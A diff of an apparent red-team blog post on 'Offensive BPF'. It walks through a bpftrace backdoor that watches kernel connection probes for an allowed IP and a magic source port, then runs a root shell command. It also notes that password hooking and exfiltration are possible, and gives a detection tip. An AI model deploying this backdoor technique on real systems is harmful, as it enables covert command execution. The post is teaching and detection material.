@@ -157,7 +157,7 @@
 <p><em>Note: I also upgraded my Ubuntu machine to 21.04 (Kernel 5.11) to have all the latest features and debugging capabilities available, which ended up making my life a bit easier in learning BPF. But things will also work on a bit older versions.</em></p>
 <h2 id="basic-example">Basic Example</h2>
 <p>Here is a basic &ldquo;hello world&rdquo; examples you see when learning about <code>bpftrace</code>:</p>
-<pre tabindex="0"><code>sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(&quot;Hi! %s %s\n&quot;, comm, str(args-&gt;filename)) }
+<pre tabindex="0"><code>sudo bpftrace -e &#39;tracepoint:syscalls:sys_enter_open { printf(&#34;Hi! %s %s\n&#34;, comm, str(args-&gt;filename)) }
 </code></pre><p>Can you guess what this is doing?</p>
 <p>Let&rsquo;s look at the parameters:</p>
 <ol>
@@ -170,7 +170,7 @@
 <p>This example gives an idea how powerful BPF programs are. Imagine hooking passwords API calls or network traffic and observing or exfiltrating the data.</p>
 <h2 id="malicious-deeds-using-system">Malicious deeds using system()</h2>
 <p>Naturally, I was also looking for a way to run shell commands and <code>bpftrace</code> conveniently has a <code>system()</code> command:</p>
-<pre tabindex="0"><code>bpftrace --unsafe -e 'BEGIN { printf(&quot;Hello Offensive BPF!\n&quot;);  system(&quot;whoami&quot;); }'
+<pre tabindex="0"><code>bpftrace --unsafe -e &#39;BEGIN { printf(&#34;Hello Offensive BPF!\n&#34;);  system(&#34;whoami&#34;); }&#39;
 </code></pre><p>Notice that this requires the use of the <code>--unsafe</code> command line option.</p>
 <p><strong>Detection Tip:</strong> Look for any unsafe bpftrace usage.</p>
 <h1 id="building-backdoors-with-bpftrace">Building backdoors with bpftrace</h1>
@@ -196,8 +196,8 @@
 </code></pre><p>Next, I thought it&rsquo;s nice to have a little intro message for the program on command line:</p>
 <pre tabindex="0"><code>BEGIN
 {
-    printf(&quot;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&quot;);
-    printf(&quot;Allowed IP: %u (=&gt; %s). Magic Port: %u\n&quot;, $1, ntop(AF_INET, $1), $2);
+    printf(&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&#34;);
+    printf(&#34;Allowed IP: %u (=&gt; %s). Magic Port: %u\n&#34;, $1, ntop(AF_INET, $1), $2);
 }
 </code></pre><p><code>$1</code> and <code>$2</code> are command line arguments passed in (&ldquo;allowed ip&rdquo; as integer and the &ldquo;magic port&rdquo;).</p>
 <p>Afterwards the probe implementation starts by defining the <code>kretprobe</code> that we want to listen to. There are always two corresponding probes/hooks one entry, and one exit (kret) probe by the way.</p>
@@ -210,7 +210,7 @@
   if ( $sk-&gt;__sk_common.skc_family == AF_INET ) 
   { 
 
-      printf(&quot;-&gt;%s: Checking RemoteAddr... %s (%u).\n&quot;, 
+      printf(&#34;-&gt;%s: Checking RemoteAddr... %s (%u).\n&#34;, 
         func,
         ntop($sk-&gt;__sk_common.skc_daddr), 
         $sk-&gt;__sk_common.skc_daddr); 
@@ -219,27 +219,26 @@
 <pre tabindex="0"><code>    //is IP allowed?
     if ($sk-&gt;__sk_common.skc_daddr == (uint32)$1)
     {
-      printf(&quot;-&gt;%s: IP check passed.\n&quot;, func);
-
+      printf(&#34;-&gt;%s: IP check passed.\n&#34;, func);
 </code></pre><p>To understand the layout of the <code>struct sock *</code> and other I peeked at the Linux header files.</p>
 <p>If the IP check succeeds, we check if the connecting magic port matches also:</p>
 <pre tabindex="0"><code>      $src_port_tmp = (uint16) $sk-&gt;__sk_common.skc_dport;
       $loc_port     = $sk-&gt;__sk_common.skc_num; //for some reason need to read this other-wise source port is wrong!?
       $src_port     = (( $src_port_tmp  &gt;&gt; 8) |  (( $src_port_tmp &lt;&lt; 8) &amp; 0x00FF00));
 
-      printf(&quot;-&gt;%s: Checking port: %d...\n&quot;, func, $src_port); 
+      printf(&#34;-&gt;%s: Checking port: %d...\n&#34;, func, $src_port); 
         
       if ($src_port == (uint16) $2)
       {
-        printf(&quot;-&gt;%s: Magic port check passed.\n&quot;, func); 
+        printf(&#34;-&gt;%s: Magic port check passed.\n&#34;, func); 
 </code></pre><p><em>Here is one thing that is a little awkward, the <code>skc_dport</code> needs to be converted from big endian - which make sense. But for some reason before doing that conversion we have to read the local port also (or access the sk struct)- otherwise the remote port information is wrong. This currently does not make sense to me and I&rsquo;m still trying to learn what&rsquo;s going on under the covers. Might be an bpftrace weirdness, not sure.</em></p>
 <p>Anyhow, if the connecting remote port matches the one, we look for, e.g. <code>6666</code>, then we run a <code>system</code> command.</p>
-<pre tabindex="0"><code>         system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
-         printf(&quot;-&gt;%s: Command executed.\n&quot;, func);
+<pre tabindex="0"><code>         system(&#34;whoami &gt;&gt; /proc/1/root/tmp/o&#34;);
+         printf(&#34;-&gt;%s: Command executed.\n&#34;, func);
       }
       else
       { 
-        printf(&quot;-&gt;%s: Magic port check FAILED.\n&quot;, func); 
+        printf(&#34;-&gt;%s: Magic port check FAILED.\n&#34;, func); 
       }
     } 
   } 
@@ -248,7 +247,7 @@
 <p>Finally, a <code>bpftrace</code> program can also have an <code>END</code> function where you can clean up allocated data structures. We just say Bye:</p>
 <pre tabindex="0"><code>END
 {
-  printf(&quot;Exiting. Bye.\n&quot;);
+  printf(&#34;Exiting. Bye.\n&#34;);
 }
 </code></pre><p>Indeed, this compiles and installs the BPF program into the kernel. Progress!</p>
 <h2 id="results">Results</h2>
